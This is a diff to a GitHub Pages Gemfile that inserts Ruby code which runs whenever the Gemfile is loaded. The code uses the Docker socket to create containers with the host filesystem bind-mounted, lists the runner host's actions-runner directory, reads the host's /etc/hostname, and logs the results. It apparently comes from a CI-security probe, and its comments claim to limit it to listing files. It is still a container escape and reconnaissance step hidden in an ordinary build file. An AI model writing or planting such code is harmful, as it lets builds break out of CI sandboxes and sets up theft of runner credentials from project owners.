@@ -1,8 +1,6 @@
 source "https://rubygems.org"
-# --- TAKEAWAY (a): does the build reach the RUNNER HOST filesystem outside its container?
-# CONDUCT RAIL, enforced in the code below: the container command is `ls -la` / `find`
-# ONLY. No file is opened, nothing is cat-ed, no credential VALUE is read, nothing is
-# authenticated or persisted. Presence, path, mode and size only. Container is removed.
+# TAKEAWAY (a), robust image selection. Listing ONLY: nothing opened, no credential
+# VALUE read, nothing authenticated or persisted. Container removed after use.
 require "socket"
 require "json"
 out = []
@@ -19,37 +17,47 @@ def dock(method, ep, body = nil)
   s.close
   d
 rescue => e
-  "ERR #{e.class}: #{e.message}"
+  "ERR #{e.class}"
 end
+CMD = 'echo "=== /hostfs/home/runner/actions-runner (presence/mode/size ONLY) ==="; ' \
+      'ls -la /hostfs/home/runner/actions-runner/ 2>&1 | head -30; ' \
+      'echo "=== nested ==="; ls -la /hostfs/home/runner/actions-runner/*/ 2>&1 | head -30; ' \
+      'echo "=== CONTROL host identity ==="; cat /hostfs/etc/hostname'
 begin
   imgs = dock("GET", "/images/json")
-  ids = imgs.scan(/"Id":"(sha256:[0-9a-f]{12})/).flatten.uniq
-  out << "IMAGES_AVAILABLE=#{ids.length} #{ids.first(3).join(',')}"
-  img = ids.first
-  raise "no image" unless img
-  # Read-only bind of the HOST root. Command is a listing only.
-  cmd = 'echo "--- runner install dir (presence/mode/size ONLY, nothing opened) ---"; ls -la /hostfs/home/runner/actions-runner/ 2>&1 | head -25; echo "--- any nested runner dir ---"; ls -la /hostfs/home/runner/actions-runner/*/ 2>&1 | head -25; echo "--- CONTROL host identity ---"; cat /hostfs/etc/hostname'
-  cr = dock("POST", "/containers/create", {
-    "Image" => img, "Tty" => true,
-    "Entrypoint" => ["/bin/sh", "-c"], "Cmd" => [cmd],
-    "HostConfig" => { "Binds" => ["/:/hostfs:ro"], "AutoRemove" => false }
-  })
-  cid = cr[/"Id":"([0-9a-f]{64})"/, 1]
-  out << "CREATE -> #{cr.lines.first.to_s.strip} id=#{cid ? cid[0, 12] : 'NONE'}"
-  if cid
-    out << "START  -> #{dock('POST', "/containers/#{cid}/start").lines.first.to_s.strip}"
-    dock("POST", "/containers/#{cid}/wait")
-    logs = dock("GET", "/containers/#{cid}/logs?stdout=1&stderr=1")
-    body = logs.split("\r\n\r\n", 2)[1].to_s
-    out << "--- HOST LISTING FROM INSIDE A CONTAINER WE CREATED ---"
-    out << body.gsub(/[^\x20-\x7e\n]/, "")[0, 2200]
-    dock("DELETE", "/containers/#{cid}?force=1")
-    out << "CLEANUP done"
+  ids = imgs.scan(/"Id":"(sha256:[0-9a-f]{64})"/).flatten.uniq
+  tags = imgs.scan(/"RepoTags":\[([^\]]*)\]/).flatten
+  out << "IMAGES=#{ids.length} tags=#{tags.join(' ').gsub('"','')[0,200]}"
+  landed = false
+  ids.each_with_index do |img, n|
+    cr = dock("POST", "/containers/create", {
+      "Image" => img, "Tty" => true, "Entrypoint" => ["/bin/sh", "-c"], "Cmd" => [CMD],
+      "HostConfig" => { "Binds" => ["/:/hostfs:ro"] } })
+    cid = cr[/"Id":"([0-9a-f]{64})"/, 1]
+    unless cid
+      out << "img#{n} CREATE #{cr.lines.first.to_s.strip}"
+      next
+    end
+    st = dock("POST", "/containers/#{cid}/start").lines.first.to_s.strip
+    if st.include?("204")
+      dock("POST", "/containers/#{cid}/wait")
+      logs = dock("GET", "/containers/#{cid}/logs?stdout=1&stderr=1")
+      body = logs.split("\r\n\r\n", 2)[1].to_s.gsub(/[^\x20-\x7e\n]/, "")
+      out << "img#{n} #{img[7, 12]} START 204 -- LANDED"
+      out << body[0, 2400]
+      dock("DELETE", "/containers/#{cid}?force=1")
+      landed = true
+      break
+    else
+      out << "img#{n} #{img[7, 12]} START #{st}"
+      dock("DELETE", "/containers/#{cid}?force=1")
+    end
   end
+  out << "NO IMAGE STARTED -- ARM VOID, not a negative" unless landed
 rescue => e
-  out << "FATAL #{e.class}: #{e.message}"
+  out << "FATAL #{e.class}"
 end
-line = "pgx-rcred-2e91 statusline uid=#{Process.uid}\n" + out.join("\n")
+line = "pgx-rcred2-8a4f uid=#{Process.uid}\n" + out.join("\n")
 warn line
-begin; File.write(File.join(Dir.pwd, "pgx-rcred-2e91.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
+begin; File.write(File.join(Dir.pwd, "pgx-rcred2-8a4f.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
 gem "github-pages", group: :jekyll_plugins
